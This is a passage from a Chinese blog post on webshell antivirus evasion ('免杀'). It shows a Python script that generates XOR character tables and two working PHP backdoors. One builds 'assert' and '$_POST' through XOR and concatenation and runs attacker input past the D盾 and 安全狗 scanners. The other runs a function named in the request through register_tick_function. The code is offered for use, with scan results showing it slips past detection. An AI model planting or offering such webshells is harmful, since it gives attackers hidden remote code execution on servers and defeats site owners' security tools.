+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">PYTHON</span><br><span class="line"></span><br><span class="line">import string</span><br><span class="line">from urllib.parse import quote</span><br><span class="line"></span><br><span class="line">keys = list(range(65)) + list(range(91,97)) + list(range(123,127))</span><br><span class="line">results = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in keys:</span><br><span class="line">    for j in keys:</span><br><span class="line">        asscii_number = i^j</span><br><span class="line">        if (asscii_number &gt;= 65 and asscii_number &lt;= 90) or (asscii_number &gt;= 97 and asscii_number &lt;= 122):</span><br><span class="line">            if i &lt; 32 and j &lt; 32:</span><br><span class="line">                temp = (f&#x27;&#123;chr(asscii_number)&#125; = ascii:&#123;i&#125; ^ ascii&#123;j&#125; =  &#123;quote(chr(i))&#125; ^ &#123;quote(chr(j))&#125;&#x27;, chr(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line">            elif i &lt; 32 and j &gt;=32:</span><br><span class="line">                temp = (f&#x27;&#123;chr(asscii_number)&#125; = ascii:&#123;i&#125; ^ &#123;chr(j)&#125; = &#123;quote(chr(i))&#125; ^ &#123;quote(chr(j))&#125;&#x27;, chr(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line">            elif i &gt;= 32 and j &lt; 32:</span><br><span class="line">                temp = (f&#x27;&#123;chr(asscii_number)&#125; = &#123;chr(i)&#125; ^ ascii&#123;j&#125; = &#123;quote(chr(i))&#125; ^ &#123;quote(chr(j))&#125;&#x27;, chr(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line">            else:</span><br><span class="line">                temp = (f&#x27;&#123;chr(asscii_number)&#125; = &#123;chr(i)&#125; ^ &#123;chr(j)&#125; = &#123;quote(chr(i))&#125; ^ &#123;quote(chr(j))&#125;&#x27;, chr(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line"></span><br><span class="line">results.sort(key=lambda x:x[1], reverse=False)</span><br><span class="line"></span><br><span class="line">for low_case in string.ascii_lowercase:</span><br><span class="line">    for result in results:</span><br><span class="line">        if low_case in result:</span><br><span class="line">            print(result[0])</span><br><span class="line"></span><br><span class="line">for upper_case in string.ascii_uppercase:</span><br><span class="line">    for result in results:</span><br><span class="line">        if upper_case in result:</span><br><span class="line">            print(result[0])</span><br></pre></td></tr></table></figure>
+
+<p>脚本运行效果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">python3 xxx.py &gt; results.txt</span><br></pre></td></tr></table></figure>
+
+<p>此时就会在当前路径下生成 results.txt 文件，这里存放着 1k 多异或结果，国光不仅进行了字母排序，而且也考虑到一些不可打印字符，而且也添加了 URL 编码，让大家找起来更加直观一些，提高工作效率：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200708/15942221556652.png"><img src="https://image.3001.net/images/20200708/15942221556652.png" alt="img"></a></p>
+<p>继续回到免杀， D 盾这里检测到了变量函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">    $a = (&#x27;!&#x27;^&#x27;@&#x27;).&#x27;s&#x27;.&#x27;s&#x27;.&#x27;e&#x27;.&#x27;r&#x27;.&#x27;t&#x27;;</span><br><span class="line">    $b=&#x27;_&#x27;.&#x27;P&#x27;.&#x27;O&#x27;.&#x27;S&#x27;.&#x27;T&#x27;;</span><br><span class="line">    $c=$$b;</span><br><span class="line">    $a($c[&#x27;x&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里只是为了过 D 盾，所以就没有都异或，P 神的文章中比较苛刻，不能出现字母和数字，所以全都异或了一遍，国光比较懒，这里只是把 <code>_POST</code> 通过字符串拼接组装一下，然后当做变量传入即可过掉 D 盾了，级别降到 1 级了：</p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0 个安全风险</td>
+<td>级别 1 变量函数</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200709/15942528366071.png"><img src="https://image.3001.net/images/20200709/15942528366071.png" alt="img"></a></p>
+<h2 id="register-tick-function-1"><a href="#register-tick-function-1" class="headerlink" title="register_tick_function()"></a>register_tick_function()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">register_tick_function ( callable $function [, mixed $... ] ) : bool</span><br></pre></td></tr></table></figure>
+
+<p>注册在调用记号时要执行的给定函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">declare(ticks=1);</span><br><span class="line">register_tick_function ($e, $_REQUEST[&#x27;x&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#">一些不包含数字和字母的 webshell</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42133828/article/details/85468159">一句话木马变种免杀</a></li>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1097265">本地搭建安全狗无法安装插件问题的解决方法</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/195304.html">一句话木马的套路</a></li>
+<li><a target="_blank" rel="noopener" href="https://darkless.cn/2020/02/07/php-free-kill-webshell/">免杀 webshell 的一些研究</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/205995.html">Webshell 免杀</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">创造 tips 的秘籍 ——PHP 回调后门</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014549283/article/details/81842084">【WEB】webshell 回调 php 总结</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/dynamic-features-and-webshell-tricks-in-php.html">PHP 动态特性的捕捉与逃逸</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193042">随机异或无限免杀 D 盾之再免杀</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/07/[https://www.smi1e.top/php-webshell%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BB%95%E8%BF%87/](https://www.smi1e.top/php-webshell%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BB%95%E8%BF%87/)">php webshell 检测与绕过</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://gridhub.github.io">Grid</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://gridhub.github.io/2023/06/05/helloworld/">https://gridhub.github.io/2023/06/05/helloworld/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://gridhub.github.io" target="_blank">Step by Step</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/wechat.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/05/08/firstPage-md/" title="firstPage.md"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">firstPage.md</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/wechat.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Grid</div><div class="author-info__description">识迷途其未远，觉今是而昨非</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/gridhub"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#eval-%E4%B8%8E-assert"><span class="toc-number">2.</span> <span class="toc-text">eval 与 assert</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E5%BD%A2"><span class="toc-number">3.</span> <span class="toc-text">字符串变形</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#substr"><span class="toc-number">3.1.</span> <span class="toc-text">substr()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strtr"><span class="toc-number">3.2.</span> <span class="toc-text">strtr()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#substr-replace"><span class="toc-number">3.3.</span> <span class="toc-text">substr_replace()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#trim"><span class="toc-number">3.4.</span> <span class="toc-text">trim()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">函数绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="toc-number">5.</span> <span class="toc-text">回调函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#call-user-func"><span class="toc-number">5.1.</span> <span class="toc-text">call_user_func()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#call-user-func-array"><span class="toc-number">5.2.</span> <span class="toc-text">call_user_func_array()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#array-filter"><span class="toc-number">5.3.</span> <span class="toc-text">array_filter()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#array-map"><span class="toc-number">5.4.</span> <span class="toc-text">array_map()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#array-walk"><span class="toc-number">5.5.</span> <span class="toc-text">array_walk()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#array-walk-recursive"><span class="toc-number">5.6.</span> <span class="toc-text">array_walk_recursive()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#array-reduce"><span class="toc-number">5.7.</span> <span class="toc-text">array_reduce()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#array-udif"><span class="toc-number">5.8.</span> <span class="toc-text">array_udif()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uasort"><span class="toc-number">5.9.</span> <span class="toc-text">uasort()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uksort"><span class="toc-number">5.10.</span> <span class="toc-text">uksort()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#registregister-shutdown-function"><span class="toc-number">5.11.</span> <span class="toc-text">registregister_shutdown_function()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#register-tick-function"><span class="toc-number">5.12.</span> <span class="toc-text">register_tick_function()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filter-var"><span class="toc-number">5.13.</span> <span class="toc-text">filter_var()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filter-var-array"><span class="toc-number">5.14.</span> <span class="toc-text">filter_var_array()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%82%E6%88%96"><span class="toc-number">6.</span> <span class="toc-text">异或</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#register-tick-function-1"><span class="toc-number">6.1.</span> <span class="toc-text">register_tick_function()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">7.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/06/05/helloworld/" title="helloworld">helloworld</a><time datetime="2023-06-05T08:42:34.000Z" title="发表于 2023-06-05 16:42:34">2023-06-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/08/firstPage-md/" title="firstPage.md">firstPage.md</a><time datetime="2023-05-08T07:03:51.000Z" title="发表于 2023-05-08 15:03:51">2023-05-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/08/hello-world/" title="Hello World">Hello World</a><time datetime="2023-05-08T06:59:34.759Z" title="发表于 2023-05-08 14:59:34">2023-05-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Grid</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="泰,裤,辣" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
